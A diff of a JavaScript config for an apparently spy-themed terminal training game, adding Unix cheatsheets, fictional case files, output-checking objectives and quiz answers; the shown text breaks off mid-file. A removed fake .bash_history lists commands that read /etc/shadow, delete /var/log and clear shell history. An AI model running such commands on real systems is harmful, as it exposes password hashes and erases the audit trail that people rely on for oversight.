@@ -88,7 +88,7 @@ const CLHConfig = (function() {
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['Documents', 'missions', 'scripts', 'tools', '.bashrc', '.bash_history', '.classified']
+                    children: ['Documents', 'missions', 'scripts', 'tools', '.bashrc', '.bash_history', '.classified', '.cli_cheatsheet']
                 },
                 '/home/operator/Documents': {
                     type: 'dir',
@@ -246,10 +246,11 @@ alias cls='clear'
                     owner: 'operator',
                     group: 'operator',
                     size: 89,
-                    content: `ssh handler@deadrop.onion
-cat /etc/shadow
-rm -rf /var/log/*
-history -c
+                    content: `whoami
+pwd
+hostname
+ls
+cat missions/handler_notes.txt
 `
                 },
                 '/home/operator/.classified': {
@@ -269,6 +270,43 @@ Handler dead drop: 40.7128° N, 74.0060° W
 Phrase: "The weather is nice in Prague"
 `
                 },
+                '/home/operator/.cli_cheatsheet': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 512,
+                    content: `CLI BASICS - OPERATOR CHEATSHEET
+==================================
+
+IDENTITY & POSITION
+  whoami          Show current username
+  pwd             Print working directory (where you are)
+  hostname        Show system hostname
+
+RECONNAISSANCE
+  ls              List directory contents
+  ls -l           Long format (permissions, size, date)
+  ls -a           Show hidden files (starting with .)
+  ls -la          Both: long format + hidden files
+
+NAVIGATION
+  cd <dir>        Change to directory
+  cd ..           Go up one level
+  cd ~            Go to home directory
+  cd              Same as cd ~ (go home)
+
+FILE READING
+  cat <file>      Display entire file contents
+  head <file>     Show first 10 lines
+  tail <file>     Show last 10 lines
+
+PRO TIP: Hidden files start with a dot (.)
+         Use ls -a to reveal them.
+
+"First rule of reconnaissance: Know where you are."
+`
+                },
             },
 
             objectives: [
@@ -276,25 +314,36 @@ Phrase: "The weather is nice in Prague"
                     id: 1,
                     task: 'RECON: Identify Operator',
                     hint: 'Identify your current user account: whoami',
-                    check: (cmd, state) => cmd.trim() === 'whoami'
+                    check: (cmd, state, output) => cmd.trim() === 'whoami' &&
+                        output && output.includes('operator')
                 },
                 {
                     id: 2,
                     task: 'RECON: Locate Position',
                     hint: 'Determine your filesystem position: pwd',
-                    check: (cmd, state) => cmd.trim() === 'pwd'
+                    check: (cmd, state, output) => cmd.trim() === 'pwd' &&
+                        output && output.includes('/home')
                 },
                 {
                     id: 3,
                     task: 'RECON: Identify Target System',
                     hint: 'Identify the hostname: hostname',
-                    check: (cmd, state) => cmd.trim() === 'hostname'
+                    check: (cmd, state, output) => cmd.trim() === 'hostname' &&
+                        output && output.includes('shadow')
                 },
                 {
                     id: 4,
                     task: 'SURVEY: Assess Environment',
                     hint: 'Survey your surroundings: ls',
-                    check: (cmd, state) => cmd.trim() === 'ls' || cmd.startsWith('ls ')
+                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
+                        output && (output.includes('missions') || output.includes('Documents'))
+                },
+                {
+                    id: 5,
+                    task: 'EXTRACT: Read Intel',
+                    hint: 'Read the handler notes: cat missions/handler_notes.txt',
+                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('handler') &&
+                        output && output.includes('whoami')
                 },
             ],
 
@@ -322,7 +371,7 @@ Phrase: "The weather is nice in Prague"
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['Documents', 'intel', 'scripts', 'logs', '.bash_history', '.bashrc']
+                    children: ['Documents', 'intel', 'scripts', 'logs', '.bash_history', '.bashrc', '.navigation_cheatsheet']
                 },
                 '/home/operator/Documents': {
                     type: 'dir',
@@ -458,7 +507,14 @@ Coordinates: 47.6062° N, 122.3321° W
                     owner: 'operator',
                     group: 'operator',
                     size: 35,
-                    content: 'whoami\nls\ncd intel\ncat briefing.txt\n'
+                    content: `ls
+cd intel
+ls -la
+cat briefing.txt
+cd .classified
+cat eyes-only.txt
+cd ~
+`
                 },
                 '/home/operator/.bashrc': {
                     type: 'file',
@@ -468,6 +524,46 @@ Coordinates: 47.6062° N, 122.3321° W
                     size: 24,
                     content: '# Operator shell config\n'
                 },
+                '/home/operator/.navigation_cheatsheet': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 512,
+                    content: `NAVIGATION - OPERATOR CHEATSHEET
+==================================
+
+MOVEMENT COMMANDS
+  cd <dir>        Change to directory
+  cd ..           Go up one directory
+  cd ~            Go to home directory
+  cd -            Go to previous directory
+  cd              Same as cd ~ (go home)
+
+RECONNAISSANCE
+  ls              List directory contents
+  ls -l           Long format (details)
+  ls -a           Show hidden files (starting with .)
+  ls -la          Both: details + hidden files
+  ls -lah         Human-readable file sizes
+
+PATH TYPES
+  ./file          Relative path (current directory)
+  ../file         Relative path (parent directory)
+  ~/file          Home directory path
+  /path/to/file   Absolute path (from root)
+
+HIDDEN CONTENT
+  - Files starting with . are hidden
+  - Use ls -a to reveal them
+  - Hidden directories can contain classified intel
+
+PRO TIP: Good operatives always check for hidden files.
+         The best intel is often in .secret locations.
+
+"Move like a ghost. Leave no trace."
+`
+                },
             },
 
             objectives: [
@@ -475,7 +571,8 @@ Coordinates: 47.6062° N, 122.3321° W
                     id: 1,
                     task: 'SURVEY: Map the Territory',
                     hint: 'Use ls to survey your current location',
-                    check: (cmd, state) => cmd.trim() === 'ls' || cmd.startsWith('ls ')
+                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
+                        output && (output.includes('intel') || output.includes('Documents'))
                 },
                 {
                     id: 2,
@@ -487,15 +584,16 @@ Coordinates: 47.6062° N, 122.3321° W
                     id: 3,
                     task: 'SCAN: Deep Reconnaissance',
                     hint: 'Reveal hidden files with: ls -la',
-                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('-') &&
-                                   (cmd.includes('l') && cmd.includes('a'))
+                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('-') &&
+                        (cmd.includes('l') && cmd.includes('a')) &&
+                        output && (output.includes('.secret') || output.includes('.classified'))
                 },
                 {
                     id: 4,
                     task: 'EXTRACT: Read the Briefing',
                     hint: 'Access the briefing.txt file: cat briefing.txt',
-                    check: (cmd, state) => cmd.trim() === 'cat briefing.txt' ||
-                                   cmd.trim() === 'cat ./briefing.txt'
+                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('briefing') &&
+                        output && output.includes('OPERATION SHADOW')
                 },
                 {
                     id: 5,
@@ -504,6 +602,16 @@ Coordinates: 47.6062° N, 122.3321° W
                     check: (cmd, state) => state.currentDir === '/home/operator'
                 },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "What is the password to the vault?",
+                acceptedAnswers: ["SHADOWRUN", "shadowrun", "Shadowrun"],
+                hint: "Look for hidden files in the intel directory. Secrets hide in the shadows.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Access denied. Search deeper - some files are hidden from plain sight.",
+                correctAnswerMessage: "Vault access granted: SHADOWRUN confirmed. You found the hidden intelligence."
+            },
 
             remoteHosts: null,
         },
@@ -529,14 +637,14 @@ Coordinates: 47.6062° N, 122.3321° W
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['evidence', 'tools', '.bash_history']
+                    children: ['evidence', 'tools', 'reports', '.bash_history', '.grep_cheatsheet']
                 },
                 '/home/operator/evidence': {
                     type: 'dir',
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['mystery.txt', 'notes.txt', 'README.txt']
+                    children: ['mystery.txt', 'notes.txt', 'README.txt', 'witness_reports.txt', 'timeline.txt']
                 },
                 '/home/operator/evidence/mystery.txt': {
                     type: 'file',
@@ -606,6 +714,56 @@ END REPORT
                     size: 163,
                     content: 'EVIDENCE DIRECTORY\n==================\nFiles in this directory are part of ongoing investigation.\nUse grep to search for patterns.\nDo not modify original evidence.\n'
                 },
+                '/home/operator/evidence/witness_reports.txt': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 512,
+                    content: `WITNESS STATEMENTS - CASE #2847
+================================
+
+WITNESS A (Rancher):
+"I was checking the cattle around 0230 when I saw the light.
+It was bright, almost blinding. The cattle were spooked.
+I lost about three hours - don't remember anything."
+
+WITNESS B (Highway Patrol):
+"Dispatch received multiple 911 calls about lights in the sky.
+When I arrived at the location, there was nothing but a
+burned patch in the field. My radio went dead for 20 minutes."
+
+WITNESS C (Pilot):
+"I was at 15,000 feet when something passed me doing
+impossible maneuvers. No aircraft I know can move like that.
+FAA has no record of any traffic in that sector."
+
+All witnesses passed polygraph examination.
+`
+                },
+                '/home/operator/evidence/timeline.txt': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 384,
+                    content: `INCIDENT TIMELINE - CASE #2847
+===============================
+0215 - First radar contact
+0230 - Witness A reports light
+0235 - 911 calls begin
+0247 - Peak activity recorded
+0300 - Subject missing time begins
+0315 - Military assets scrambled
+0330 - FAA communication blackout
+0400 - Object disappears from radar
+0603 - Subject found confused in field
+0800 - Evidence collection begins
+1200 - Site secured and classified
+
+Total duration of event: ~4 hours
+`
+                },
                 '/home/operator/tools': {
                     type: 'dir',
                     perms: 'drwxr-xr-x',
@@ -627,7 +785,67 @@ END REPORT
                     owner: 'operator',
                     group: 'operator',
                     size: 34,
-                    content: 'ls\ncd evidence\ncat mystery.txt\n'
+                    content: `ls evidence/
+cat evidence/mystery.txt
+grep Secret evidence/mystery.txt
+grep "Secret Code" evidence/mystery.txt
+grep -n "Secret Code" evidence/mystery.txt
+grep -i witness evidence/
+`
+                },
+                '/home/operator/reports': {
+                    type: 'dir',
+                    perms: 'drwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    children: ['README.txt']
+                },
+                '/home/operator/reports/README.txt': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 128,
+                    content: 'REPORTS DIRECTORY\n=================\nSave your grep output here using redirection:\ngrep "pattern" file > reports/findings.txt\n'
+                },
+                '/home/operator/.grep_cheatsheet': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 768,
+                    content: `GREP - PATTERN HUNTING CHEATSHEET
+===================================
+
+BASIC USAGE
+  grep "pattern" file       Search for pattern in file
+  grep "pattern" dir/*      Search in all files in directory
+
+USEFUL FLAGS
+  -i          Case insensitive search
+  -n          Show line numbers
+  -c          Count matching lines
+  -v          Invert match (show non-matching)
+  -r          Recursive (search subdirectories)
+  -l          List only filenames with matches
+  -w          Match whole words only
+
+PATTERN EXAMPLES
+  grep "error" log.txt          Find "error" in log.txt
+  grep -i "secret" *.txt        Case-insensitive in all .txt
+  grep -n "code" evidence/*     Show line numbers
+  grep -rn "pattern" ./         Recursive with line numbers
+
+COMBINING FLAGS
+  grep -in "pattern" file       Case-insensitive + line numbers
+  grep -rn "pattern" dir/       Recursive + line numbers
+  grep -c "pattern" file        Just count matches
+
+PRO TIP: Wrap patterns with spaces in quotes.
+         grep "Secret Code" is different from grep Secret Code
+
+"Find the pattern. Extract the truth."
+`
                 },
             },
 
@@ -636,19 +854,23 @@ END REPORT
                     id: 1,
                     task: 'RECON: Survey the Evidence',
                     hint: 'Examine the evidence directory: ls evidence/',
-                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('evidence')
+                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('evidence') &&
+                        output && (output.includes('mystery') || output.includes('notes'))
                 },
                 {
                     id: 2,
                     task: 'INTEL: Examine the Target File',
                     hint: 'Preview mystery.txt: cat evidence/mystery.txt',
-                    check: (cmd, state) => cmd.includes('cat') && cmd.includes('mystery')
+                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('mystery') &&
+                        output && output.includes('CLASSIFIED')
                 },
                 {
                     id: 3,
                     task: 'HUNT: Search for "Secret"',
                     hint: 'Use grep to find lines with "Secret"',
-                    check: (cmd, state) => cmd.includes('grep') && (cmd.includes('Secret') || cmd.includes('secret'))
+                    check: (cmd, state, output) => cmd.includes('grep') &&
+                        (cmd.includes('Secret') || cmd.includes('secret')) &&
+                        output && output.includes('Secret')
                 },
                 {
                     id: 4,
@@ -660,10 +882,20 @@ END REPORT
                     id: 5,
                     task: 'VERIFY: Confirm with Line Number',
                     hint: 'Document with line numbers: grep -n "Secret Code" evidence/mystery.txt',
-                    check: (cmd, state) => cmd.includes('grep') && cmd.includes('-n') &&
-                                   (cmd.includes('Secret') || cmd.includes('Code'))
+                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-n') &&
+                        output && /^\d+:/.test(output.trim())
                 },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "What is the secret code hidden in the evidence?",
+                acceptedAnswers: ["42XDFL", "42xdfl"],
+                hint: "Use grep to search for 'Secret Code' in the mystery.txt file.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Code not recognized. Search the evidence more carefully.",
+                correctAnswerMessage: "Code verified: 42XDFL. Evidence extraction complete. You've mastered pattern hunting."
+            },
 
             remoteHosts: null,
         },
@@ -688,7 +920,7 @@ END REPORT
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['analysis', 'tools', '.bash_history']
+                    children: ['analysis', 'tools', 'reports', '.bash_history', '.process_cheatsheet']
                 },
                 '/home/operator/analysis': {
                     type: 'dir',
@@ -794,42 +1026,117 @@ hostile and should be flagged for immediate review.
                     owner: 'operator',
                     group: 'operator',
                     size: 42,
-                    content: 'ls\ncd analysis\ncat processes.txt\n'
+                    content: `ls
+cd analysis
+cat processes.txt
+cat baseline.txt
+grep unknown processes.txt
+grep "8.2" processes.txt
+cat .incident_log
+`
+                },
+                '/home/operator/reports': {
+                    type: 'dir',
+                    perms: 'drwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    children: ['README.txt']
+                },
+                '/home/operator/reports/README.txt': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 128,
+                    content: 'REPORTS DIRECTORY\n=================\nDocument your findings here.\nUse redirection: grep pattern file > reports/findings.txt\n'
+                },
+                '/home/operator/.process_cheatsheet': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 768,
+                    content: `PROCESS INVESTIGATION - OPERATOR CHEATSHEET
+=============================================
+
+PROCESS MONITORING
+  ps                 List your processes
+  ps aux             List ALL processes (detailed)
+  ps -ef             List ALL processes (full format)
+  top                Interactive process viewer (q to quit)
+
+PROCESS ANALYSIS
+  ps aux | grep name     Find specific process
+  ps aux | sort -k3 -rn  Sort by CPU (column 3)
+  ps aux | sort -k4 -rn  Sort by memory (column 4)
+
+THREAT HUNTING
+  1. Get baseline of normal processes
+  2. Compare current snapshot to baseline
+  3. Look for unknown or suspicious names
+  4. Check for high CPU/memory usage
+  5. Investigate PIDs not in baseline
+
+READING PROCESS OUTPUT
+  PID   - Process ID (unique identifier)
+  CPU%  - CPU usage percentage
+  MEM%  - Memory usage percentage
+
+SUSPICIOUS INDICATORS
+  - Unknown process names
+  - High CPU with no explanation
+  - Processes not in baseline
+  - Random alphanumeric names
+
+"Trust nothing. Verify everything."
+`
                 },
             },
 
             objectives: [
                 {
                     id: 1,
-                    task: 'Locate the analysis directory',
-                    hint: 'Try: ls',
-                    check: (cmd, state) => cmd.trim() === 'ls' || cmd.trim().startsWith('ls ')
+                    task: 'RECON: Locate Analysis Data',
+                    hint: 'Survey your environment: ls',
+                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
+                        output && (output.includes('analysis') || output.includes('tools'))
                 },
                 {
                     id: 2,
-                    task: 'Enter the analysis directory',
-                    hint: 'Try: cd analysis',
+                    task: 'INFILTRATE: Enter Analysis Directory',
+                    hint: 'Navigate to analysis: cd analysis',
                     check: (cmd, state) => state.currentDir.includes('/analysis')
                 },
                 {
                     id: 3,
-                    task: 'Review the process list',
-                    hint: 'Try: cat processes.txt',
-                    check: (cmd, state) => cmd.includes('cat') && cmd.includes('processes')
+                    task: 'INTEL: Review Process Snapshot',
+                    hint: 'Read the process list: cat processes.txt',
+                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('processes') &&
+                        output && output.includes('PID')
                 },
                 {
                     id: 4,
-                    task: 'Find the anomaly with grep',
-                    hint: 'Try: grep "unknown" processes.txt',
+                    task: 'HUNT: Identify the Rogue Process',
+                    hint: 'Search for anomalies: grep "unknown" processes.txt',
                     check: (cmd, state, output) => output && output.includes('unknown_process')
                 },
                 {
                     id: 5,
-                    task: 'Confirm the threat by CPU usage',
-                    hint: 'Try: grep "8.2" processes.txt',
+                    task: 'VERIFY: Confirm by CPU Usage',
+                    hint: 'Verify high CPU: grep "8.2" processes.txt',
                     check: (cmd, state, output) => cmd.includes('grep') && output && output.includes('8.2')
                 },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "What is the name of the unauthorized process?",
+                acceptedAnswers: ["unknown_process", "unknown process", "623"],
+                hint: "Compare the process list to the baseline. What process is NOT approved?",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Process not identified. Check baseline.txt for approved processes.",
+                correctAnswerMessage: "Threat confirmed: unknown_process (PID 623). Flagged for termination."
+            },
 
             remoteHosts: null,
         },
@@ -854,7 +1161,7 @@ hostile and should be flagged for immediate review.
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['logs', 'reports', '.bash_history', '.classified_memo']
+                    children: ['logs', 'reports', '.bash_history', '.classified_memo', '.log_cheatsheet']
                 },
                 '/home/operator/logs': {
                     type: 'dir',
@@ -1004,7 +1311,58 @@ If this is real, everything changes.
                     owner: 'operator',
                     group: 'operator',
                     size: 42,
-                    content: 'ls\ncd logs\nhead system.log\n'
+                    content: `ls
+cd logs
+head system.log
+tail system.log
+grep ERROR system.log
+grep -c ERROR system.log
+grep -i warn system.log
+`
+                },
+                '/home/operator/.log_cheatsheet': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 768,
+                    content: `LOG ANALYSIS - OPERATOR CHEATSHEET
+====================================
+
+READING LOGS
+  cat file.log       Display entire log
+  head file.log      Show first 10 lines
+  head -n 20 file    Show first 20 lines
+  tail file.log      Show last 10 lines
+  tail -n 50 file    Show last 50 lines
+  tail -f file.log   Follow log in real-time
+
+SEARCHING LOGS
+  grep "pattern" file.log          Find matching lines
+  grep -i "pattern" file.log       Case insensitive
+  grep -c "pattern" file.log       Count matches
+  grep -n "pattern" file.log       Show line numbers
+
+LOG SEVERITY LEVELS
+  [INFO]  - Informational message
+  [WARN]  - Warning, potential issue
+  *ERROR* - Error condition
+  [CRIT]  - Critical, immediate attention
+  [ALERT] - Alert condition
+
+COMMON PATTERNS
+  grep ERROR system.log           Find all errors
+  grep -c ERROR system.log        Count errors
+  grep "Jan 15 02:47" system.log  Filter by timestamp
+
+LOG ANALYSIS WORKFLOW
+  1. Survey the log with head/tail
+  2. Search for ERROR and WARN entries
+  3. Count occurrences with grep -c
+  4. Document findings with line numbers
+
+"Every action leaves a trace. Find it."
+`
                 },
                 '/home/operator/.classified_memo': {
                     type: 'file',
@@ -1031,33 +1389,38 @@ The official cover story is "equipment malfunction."
             objectives: [
                 {
                     id: 1,
-                    task: 'Locate log files',
-                    hint: 'Try: ls',
-                    check: (cmd, state) => cmd.trim() === 'ls' || cmd.trim().startsWith('ls ')
+                    task: 'RECON: Locate Log Files',
+                    hint: 'Survey your environment: ls',
+                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
+                        output && (output.includes('logs') || output.includes('reports'))
                 },
                 {
                     id: 2,
-                    task: 'Enter the logs directory',
-                    hint: 'Try: cd logs',
+                    task: 'INFILTRATE: Enter Logs Directory',
+                    hint: 'Navigate to logs: cd logs',
                     check: (cmd, state) => state.currentDir.includes('/logs')
                 },
                 {
                     id: 3,
-                    task: 'Preview the system log',
-                    hint: 'Try: head system.log',
-                    check: (cmd, state) => cmd.includes('head') && cmd.includes('system')
+                    task: 'SURVEY: Preview System Log',
+                    hint: 'Preview with head: head system.log',
+                    check: (cmd, state, output) => cmd.includes('head') && cmd.includes('system') &&
+                        output && output.includes('signal_proc')
                 },
                 {
                     id: 4,
-                    task: 'Find all ERROR entries',
-                    hint: 'Try: grep "ERROR" system.log',
-                    check: (cmd, state, output) => cmd.includes('grep') && (cmd.toLowerCase().includes('error') || cmd.includes('ERROR')) && output && output.includes('ERROR')
+                    task: 'HUNT: Find All ERROR Entries',
+                    hint: 'Search for errors: grep "ERROR" system.log',
+                    check: (cmd, state, output) => cmd.includes('grep') &&
+                        (cmd.toLowerCase().includes('error') || cmd.includes('ERROR')) &&
+                        output && output.includes('ERROR')
                 },
                 {
                     id: 5,
-                    task: 'Count error entries',
-                    hint: 'Try: grep -c "ERROR" system.log',
-                    check: (cmd, state) => cmd.includes('grep') && cmd.includes('-c') && (cmd.toLowerCase().includes('error') || cmd.includes('ERROR'))
+                    task: 'ANALYZE: Count Error Entries',
+                    hint: 'Count errors: grep -c "ERROR" system.log',
+                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-c') &&
+                        output && /^\d+$/.test(output.trim())
                 },
             ],
 
@@ -1104,7 +1467,7 @@ The official cover story is "equipment malfunction."
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['intel', 'temp', '.bash_history', '.dead_drop']
+                    children: ['intel', 'temp', 'backup', '.bash_history', '.dead_drop', '.fileops_cheatsheet']
                 },
                 '/home/operator/intel': {
                     type: 'dir',
@@ -1173,13 +1536,77 @@ Status: Awaiting cryptanalysis
                     size: 64,
                     content: 'DECRYPT_KEY=0x7F3A9B2C\nSESSION_ID=SHADOWSTRIKE-447\n'
                 },
+                '/home/operator/backup': {
+                    type: 'dir',
+                    perms: 'drwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    children: ['README.txt']
+                },
+                '/home/operator/backup/README.txt': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 128,
+                    content: 'BACKUP DIRECTORY\n================\nStore backup copies here using: cp file backup/\nRemember: Two copies is one, one copy is none.\n'
+                },
                 '/home/operator/.bash_history': {
                     type: 'file',
                     perms: '-rw-------',
                     owner: 'operator',
                     group: 'operator',
                     size: 12,
-                    content: ''
+                    content: `mkdir operations
+touch operations/mission.log
+cp intel/briefing.txt operations/
+mv temp/data.txt operations/classified.txt
+rm -r temp
+ls -la
+`
+                },
+                '/home/operator/.fileops_cheatsheet': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 768,
+                    content: `FILE OPERATIONS - OPERATOR CHEATSHEET
+=======================================
+
+CREATING
+  mkdir dir           Create directory
+  mkdir -p a/b/c      Create nested directories
+  touch file          Create empty file (or update timestamp)
+
+COPYING
+  cp source dest      Copy file
+  cp -r dir dest      Copy directory recursively
+  cp file1 file2 dir/ Copy multiple files to directory
+
+MOVING / RENAMING
+  mv source dest      Move or rename file
+  mv file dir/        Move file into directory
+  mv old.txt new.txt  Rename file
+
+REMOVING
+  rm file             Remove file
+  rm -r dir           Remove directory recursively
+  rm -f file          Force remove (no prompt)
+  rm -rf dir          Force remove directory
+
+BEST PRACTICES
+  1. Always backup before deleting
+  2. Use -i flag for interactive confirmation
+  3. Double-check rm commands before executing
+  4. Test with ls first to verify paths
+
+OPERATOR TIP:
+  Copy sensitive files before moving:
+  cp file backup/ && mv file classified/
+
+"Control the filesystem. Control the operation."
+`
                 },
                 '/home/operator/.dead_drop': {
                     type: 'file',
@@ -1276,7 +1703,7 @@ BURN AFTER READING
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['secure', 'public', '.shadow_network']
+                    children: ['secure', 'public', '.bash_history', '.shadow_network', '.permissions_cheatsheet']
                 },
                 '/home/operator/secure': {
                     type: 'dir',
@@ -1368,6 +1795,19 @@ This terminal is for authorized personnel only.
 All activity is monitored and logged.
 `
                 },
+                '/home/operator/.bash_history': {
+                    type: 'file',
+                    perms: '-rw-------',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 128,
+                    content: `ls -la secure/
+chmod 600 secure/secret.txt
+chmod 755 secure/deploy.sh
+stat secure/secret.txt
+ls -la
+`
+                },
                 '/home/operator/.shadow_network': {
                     type: 'file',
                     perms: '-rw-------',
@@ -1384,38 +1824,86 @@ Mesh key rotation: Every 6 hours
 Next rotation: 0600 UTC
 `
                 },
+                '/home/operator/.permissions_cheatsheet': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 768,
+                    content: `PERMISSIONS - OPERATOR CHEATSHEET
+===================================
+
+READING PERMISSIONS (ls -l output)
+  drwxr-xr-x  = directory, owner rwx, group rx, other rx
+  -rw-r--r--  = file, owner rw, group r, other r
+
+  Position: [type][owner][group][other]
+  r = read (4), w = write (2), x = execute (1)
+
+NUMERIC NOTATION
+  0 = ---    4 = r--
+  1 = --x    5 = r-x
+  2 = -w-    6 = rw-
+  3 = -wx    7 = rwx
+
+COMMON PERMISSIONS
+  644 = -rw-r--r--  Standard file
+  755 = -rwxr-xr-x  Executable script
+  600 = -rw-------  Private file (secrets)
+  700 = -rwx------  Private executable
+
+CHANGING PERMISSIONS
+  chmod 600 file       Numeric mode
+  chmod u+x file       Add execute for user
+  chmod go-rwx file    Remove all for group/other
+  chmod +x script.sh   Make executable
+
+SPECIAL DIRECTORIES
+  700 = drwx------   Private directory
+  755 = drwxr-xr-x   Shared directory
+
+SECURITY TIP:
+  Secrets should always be 600 or 700
+  Never leave sensitive files world-readable
+
+"Control access. Protect the mission."
+`
+                },
             },
 
             objectives: [
                 {
                     id: 1,
-                    task: 'Analyze current permissions',
-                    hint: 'Try: ls -la secure/',
-                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('-l') && cmd.includes('secure')
+                    task: 'RECON: Analyze Current Permissions',
+                    hint: 'List permissions: ls -la secure/',
+                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('-l') &&
+                        cmd.includes('secure') && output && output.includes('rw')
                 },
                 {
                     id: 2,
-                    task: 'Restrict secret.txt to 600',
-                    hint: 'Try: chmod 600 secure/secret.txt',
+                    task: 'LOCKDOWN: Restrict Secret File',
+                    hint: 'Owner-only access: chmod 600 secure/secret.txt',
                     check: (cmd, state) => cmd.includes('chmod') && cmd.includes('600') && cmd.includes('secret')
                 },
                 {
                     id: 3,
-                    task: 'Make deploy.sh executable (755)',
-                    hint: 'Try: chmod 755 secure/deploy.sh',
+                    task: 'ENABLE: Make Script Executable',
+                    hint: 'Full permissions: chmod 755 secure/deploy.sh',
                     check: (cmd, state) => cmd.includes('chmod') && cmd.includes('755') && cmd.includes('deploy')
                 },
                 {
                     id: 4,
-                    task: 'Verify permission changes',
-                    hint: 'Try: ls -la secure/',
-                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('-l') && cmd.includes('secure')
+                    task: 'VERIFY: Check Secret File Permissions',
+                    hint: 'Use stat to inspect: stat secure/secret.txt',
+                    check: (cmd, state, output) => cmd.includes('stat') && cmd.includes('secret') &&
+                        output && output.includes('Access')
                 },
                 {
                     id: 5,
-                    task: 'Audit with stat command',
-                    hint: 'Try: stat secure/audit.log',
-                    check: (cmd, state) => cmd.includes('stat') && cmd.includes('audit')
+                    task: 'AUDIT: Review Audit Log Details',
+                    hint: 'Inspect log file: stat secure/audit.log',
+                    check: (cmd, state, output) => cmd.includes('stat') && cmd.includes('audit') &&
+                        output && output.includes('Access')
                 },
             ],
 
@@ -1458,7 +1946,7 @@ Next rotation: 0600 UTC
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['scripts', 'data', '.bash_history', '.exfil_protocol']
+                    children: ['scripts', 'data', '.bash_history', '.exfil_protocol', '.scripting_cheatsheet']
                 },
                 '/home/operator/scripts': {
                     type: 'dir',
@@ -1596,8 +2084,14 @@ PHOENIX     - EXTRACTED
                     perms: '-rw-------',
                     owner: 'operator',
                     group: 'operator',
-                    size: 0,
-                    content: ''
+                    size: 128,
+                    content: `ls scripts/
+cat scripts/recon.sh
+bash scripts/recon.sh
+bash scripts/backup.sh
+ls -la
+chmod +x scripts/*.sh
+`
                 },
                 '/home/operator/.exfil_protocol': {
                     type: 'file',
@@ -1615,38 +2109,88 @@ PHOENIX     - EXTRACTED
 5. Go dark for 72 hours
 `
                 },
+                '/home/operator/.scripting_cheatsheet': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 768,
+                    content: `SHELL SCRIPTING - OPERATOR CHEATSHEET
+=======================================
+
+SCRIPT BASICS
+  #!/bin/bash          Shebang - tells system to use bash
+  chmod +x script.sh   Make script executable
+  ./script.sh          Run script directly
+  bash script.sh       Run with bash explicitly
+
+VARIABLES
+  VAR="value"          Set variable (no spaces!)
+  echo "$VAR"          Print variable
+  $(command)           Command substitution
+  $1, $2, ...          Script arguments
+
+COMMON COMMANDS IN SCRIPTS
+  echo "text"          Print output
+  read VAR             Read user input
+  date +%Y%m%d         Formatted date
+  whoami               Current user
+  hostname             Current host
+  pwd                  Current directory
+
+OPERATORS
+  command1 && command2   Run 2 if 1 succeeds
+  command1 || command2   Run 2 if 1 fails
+  command1 ; command2    Run both regardless
+  command > file         Redirect output to file
+  command >> file        Append output to file
+
+BEST PRACTICES
